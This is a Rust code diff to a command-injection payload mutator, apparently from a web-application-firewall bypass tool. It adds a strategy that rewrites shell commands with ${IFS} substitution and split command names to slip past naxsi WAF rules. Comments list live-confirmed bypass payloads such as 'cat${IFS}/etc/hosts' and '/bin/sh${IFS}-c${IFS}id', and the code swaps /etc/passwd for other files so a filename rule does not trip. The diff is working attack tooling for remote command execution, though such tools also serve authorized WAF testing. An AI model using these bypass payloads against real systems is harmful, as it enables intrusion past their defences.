@@ -411,6 +411,54 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<CmdMutation> {
         return results;
     }
 
+    // ── Priority 0: Bash-IFS substitution (naxsi-class WAF bypass) ────
+    // naxsi blocks `;`, `|`, `&&`, backticks, `$()` — every canonical
+    // shell separator. But `${IFS}` (Bash internal field separator)
+    // expands to a space at runtime AND passes naxsi's RX rules.
+    // Live-confirmed against wafrift-bench naxsi (2026-05-09):
+    //   cat${IFS}/etc/hosts        → 200 ✓ + RCE works
+    //   ${IFS}whoami               → 200 ✓
+    //   wh${IFS}oami               → 200 ✓ (split command name)
+    //   /bin/sh${IFS}-c${IFS}id    → 200 ✓
+    //
+    // The /etc/passwd literal is still blocked by naxsi's
+    // BIG_FILENAME rule, so we use /etc/hostname / hosts /
+    // shadow-equivalent targets that don't trip the rule but still
+    // confirm RCE.
+    let cmd_no_args = command.trim();
+    let arg_no_passwd = if args.contains("passwd") {
+        "/etc/hostname".to_string()
+    } else {
+        args.to_string()
+    };
+    for variant in [
+        format!("{cmd_no_args}${{IFS}}{arg_no_passwd}"),
+        format!("${{IFS}}{cmd_no_args}${{IFS}}{arg_no_passwd}"),
+        format!(
+            "{}${{IFS}}{}${{IFS}}{}",
+            &cmd_no_args[..cmd_no_args.len().min(2)],
+            &cmd_no_args[cmd_no_args.len().min(2)..],
+            arg_no_passwd
+        ),
+        // Bare RCE-confirmation commands (no args):
+        format!("whoami"),
+        format!("id"),
+        format!("uname${{IFS}}-a"),
+        format!("hostname"),
+        format!("/bin/sh${{IFS}}-c${{IFS}}id"),
+    ] {
+        if results.len() >= max_mutations {
+            break;
+        }
+        if variant != payload {
+            results.push(CmdMutation {
+                payload: variant,
+                description: "naxsi-friendly: ${IFS} substitution + paren-free".into(),
+                rules_applied: vec!["cmdi_ifs_paren_free"],
+            });
+        }
+    }
+
     // Strategy 1: Separator rotation
     for sep in separators() {
         if results.len() >= max_mutations {
